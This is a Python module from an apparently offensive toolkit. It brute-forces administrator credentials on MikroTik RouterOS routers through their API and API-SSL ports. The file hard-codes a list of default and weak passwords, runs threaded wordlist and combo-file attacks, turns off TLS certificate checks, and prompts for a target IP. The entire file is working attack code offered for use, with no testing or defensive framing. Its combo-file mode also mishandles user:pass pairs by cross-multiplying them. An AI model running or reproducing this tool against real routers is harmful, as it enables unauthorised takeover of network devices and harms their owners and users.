#!/usr/bin/env python3
# PHZ//VOID - Module 1: Brute Force Attack
# Brute force credentials via MikroTik API / API-SSL / WinBox

import socket
import ssl
import time
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from typing import List, Tuple, Optional
import sys
import os

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.utils import HackerStyle, Logger
from lib.mikrotik_api import MikrotikAPI


class BruteForceModule:
    """
    Brute Force Module untuk MikroTik RouterOS
    Support: API (8728), API-SSL (8729)
    """

    # Default credentials (paling efektif)
    DEFAULT_CREDS = [
        ("admin", ""),
        ("admin", "admin"),
        ("admin", "123456"),
        ("admin", "password"),
        ("admin", "admin123"),
        ("admin", "mikrotik"),
        ("admin", "routeros"),
        ("admin", "MikroTik"),
        ("admin", "12345678"),
        ("admin", "qwerty"),
        ("root", ""),
        ("root", "root"),
        ("user", "user"),
    ]

    def __init__(self, target: str):
        self.target = target
        self.logger = Logger("BruteForce")
        self.found_credentials: List[Tuple[str, str]] = []
        self.attempts = 0
        self.start_time: Optional[datetime] = None
        self._lock = threading.Lock()
        self._stop_event = threading.Event()

    def test_connection(self, port: int = 8728, use_ssl: bool = False) -> bool:
        """Test koneksi ke API port"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((self.target, port))
            sock.close()

            if result != 0:
                return False

            if not use_ssl:
                return True

            # Test SSL handshake
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE

            with socket.create_connection((self.target, port), timeout=5) as sock:
                with context.wrap_socket(sock, server_hostname=self.target):
                    return True
        except:
            return False

    def try_login(self, username: str, password: str, port: int = 8728, use_ssl: bool = False) -> bool:
        """Attempt login with one credential pair"""
        with self._lock:
            self.attempts += 1

        if self._stop_event.is_set():
            return False

        try:
            api = MikrotikAPI(host=self.target, port=port, use_ssl=use_ssl, timeout=6)
            if api.connect() and api.login(username, password):
                api.disconnect()
                return True
            api.disconnect()
        except:
            pass
        return False

    def quick_attack(self, port: int = 8728, use_ssl: bool = False) -> List[Tuple[str, str]]:
        """Quick attack using default credentials"""
        HackerStyle.warning("Starting QUICK ATTACK with default credentials...")
        HackerStyle.info(f"Target → {self.target}:{port} (SSL: {use_ssl})")

        if not self.test_connection(port, use_ssl):
            HackerStyle.error(f"Cannot connect to {self.target}:{port}")
            return []

        HackerStyle.success(f"Connected to {self.target}:{port}")

        self.start_time = datetime.now()
        self.found_credentials.clear()
        self.attempts = 0
        self._stop_event.clear()

        for username, password in self.DEFAULT_CREDS:
            if self._stop_event.is_set():
                break

            display_pass = "(blank)" if not password else password
            HackerStyle.info(f"Trying → {username}:{display_pass}")

            if self.try_login(username, password, port, use_ssl):
                with self._lock:
                    self.found_credentials.append((username, password))
                HackerStyle.success(f"✅ SUCCESS! {username} : {password}")
                break

        self._print_result()
        return self.found_credentials

    def brute_force(self, usernames: List[str], passwords: List[str],
                    port: int = 8728, use_ssl: bool = False,
                    threads: int = 20, delay: float = 0.08) -> List[Tuple[str, str]]:
        """Full brute force with custom wordlists"""
        total = len(usernames) * len(passwords)
        HackerStyle.warning(f"Starting BRUTE FORCE on {self.target}:{port}")
        HackerStyle.info(f"Total combinations: {total:,} | Threads: {threads} | Delay: {delay}s")

        if not self.test_connection(port, use_ssl):
            HackerStyle.error(f"Cannot connect to {self.target}:{port}")
            return []

        self.start_time = datetime.now()
        self.found_credentials.clear()
        self.attempts = 0
        self._stop_event.clear()

        combinations = [(u, p) for u in usernames for p in passwords]

        def worker(cred: Tuple[str, str]):
            if self._stop_event.is_set():
                return None

            username, password = cred
            time.sleep(delay)

            if self.try_login(username, password, port, use_ssl):
                with self._lock:
                    if not self.found_credentials:
                        self.found_credentials.append((username, password))
                        self._stop_event.set()
                return (username, password)
            return None

        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(worker, combo) for combo in combinations]

            for future in as_completed(futures):
                if self._stop_event.is_set():
                    executor.shutdown(wait=False, cancel_futures=True)
                    break
                try:
                    result = future.result()
                except:
                    continue

                # Progress
                with self._lock:
                    if self.attempts % 50 == 0 and self.attempts > 0:
                        elapsed = (datetime.now() - self.start_time).total_seconds()
                        rate = self.attempts / elapsed if elapsed > 0 else 0
                        HackerStyle.status_bar(self.attempts, total, f"Rate: {rate:.1f} att/s")

        self._print_result()
        return self.found_credentials

    def _print_result(self):
        """Print final result"""
        elapsed = (datetime.now() - self.start_time).total_seconds() if self.start_time else 0

        if self.found_credentials:
            HackerStyle.success(f"\n✅ CREDENTIALS FOUND in {elapsed:.2f} seconds!")
            for u, p in self.found_credentials:
                HackerStyle.success(f"   → {u} : {p}")
        else:
            HackerStyle.error(f"\n❌ No credentials found after {self.attempts:,} attempts "
                            f"({elapsed:.2f}s)")

    def brute_force_with_wordlist(self, user_file: Optional[str] = None,
                                  pass_file: Optional[str] = None,
                                  combo_file: Optional[str] = None,
                                  port: int = 8728, use_ssl: bool = False) -> List[Tuple[str, str]]:
        """Brute force from wordlist files"""
        usernames: List[str] = []
        passwords: List[str] = []

        # Combo file support (user:pass)
        if combo_file and os.path.exists(combo_file):
            HackerStyle.info(f"Loading combo file: {combo_file}")
            with open(combo_file, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    line = line.strip()
                    if ':' in line:
                        u, p = line.split(':', 1)
                        usernames.append(u.strip())
                        passwords.append(p.strip())
            return self.brute_force(usernames, passwords, port=port, use_ssl=use_ssl)

        # Username file
        if user_file and os.path.exists(user_file):
            with open(user_file, 'r', encoding='utf-8', errors='ignore') as f:
                usernames = [line.strip() for line in f if line.strip()]
        else:
            usernames = ["admin"]
            HackerStyle.warning("No username file → using default: admin")

        # Password file
        if pass_file and os.path.exists(pass_file):
            with open(pass_file, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]
        else:
            passwords = [p for _, p in self.DEFAULT_CREDS]
            HackerStyle.warning("No password file → using default list")

        return self.brute_force(usernames, passwords, port=port, use_ssl=use_ssl)


# ==================== STANDALONE TEST ====================
if __name__ == "__main__":
    HackerStyle.banner()

    print("\n" + "="*65)
    print(" " * 18 + "BRUTE FORCE MODULE")
    print("="*65 + "\n")

    target = input(HackerStyle.CYAN + "[?] Target IP: " + HackerStyle.RESET).strip()
    if not target:
        sys.exit(1)

    port_input = input(HackerStyle.CYAN + "[?] Port (8728/API | 8729/SSL): " + HackerStyle.RESET).strip()
    port = int(port_input) if port_input else 8728
    use_ssl = port in (8729, 443)

    bf = BruteForceModule(target)

    print("\n   [1] Quick Attack (Default Credentials)")
    print("   [2] Full Brute Force (Wordlist)")

    choice = input(f"\n{HackerStyle.CYAN}[?] Choose: {HackerStyle.RESET}").strip()

    if choice == "1":
        bf.quick_attack(port=port, use_ssl=use_ssl)
    else:
        user_file = input(HackerStyle.CYAN + "[?] Username file (Enter = skip): " + HackerStyle.RESET).strip() or None
        pass_file = input(HackerStyle.CYAN + "[?] Password file (Enter = skip): " + HackerStyle.RESET).strip() or None
        combo_file = input(HackerStyle.CYAN + "[?] Combo file (user:pass) (Enter = skip): " + HackerStyle.RESET).strip() or None

        bf.brute_force_with_wordlist(
            user_file=user_file,
            pass_file=pass_file,
            combo_file=combo_file,
            port=port,
            use_ssl=use_ssl
        )